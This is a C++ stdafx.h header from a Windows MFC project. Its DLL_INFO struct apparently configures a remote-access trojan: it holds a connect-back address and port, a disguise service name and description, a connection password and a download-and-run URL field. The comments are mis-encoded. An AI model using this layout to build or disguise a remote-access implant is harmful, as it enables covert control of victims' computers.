// stdafx.h : include file for standard system include files,
//  or project specific include files that are used frequently, but
//      are changed infrequently
//

#if !defined(AFX_STDAFX_H__1DD676CB_55D6_4485_812A_D85014872E24__INCLUDED_)
#define AFX_STDAFX_H__1DD676CB_55D6_4485_812A_D85014872E24__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#define _WIN32_WINNT 0x0500  ///�û�״̬��ʾͷ�ļ�����Ҫ��

// Insert your headers here
#define WIN32_LEAN_AND_MEAN		// Exclude rarely-used stuff from Windows headers
#include <AFX.h>
#include <stdio.h>
#include <windows.h>
#include "MyFunc.h"
#include "ClientSocket.h"
#include <SHELLAPI.h>

struct DLL_INFO
{
	char LoginAddr[100];    //���ߵ�ַ
	UINT LoginPort;
	char ServiceName[50];//��������
	char ServiceDisplayName[50]; //������ʾ
	char ServiceDescription[150];  //��������
	char UpGroup[32];       //����
	char strRemark[32];     //��ע
	BOOL NoInstall;        // TRUE ��ɫ��װ, FALSE ����
	char ConnetPass[20];
	BOOL Dele_Kzj;                //���߼�¼
	CHAR szDownRun[300];     //�����ַ
};

// TODO: reference additional headers your program requires here

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_STDAFX_H__1DD676CB_55D6_4485_812A_D85014872E24__INCLUDED_)

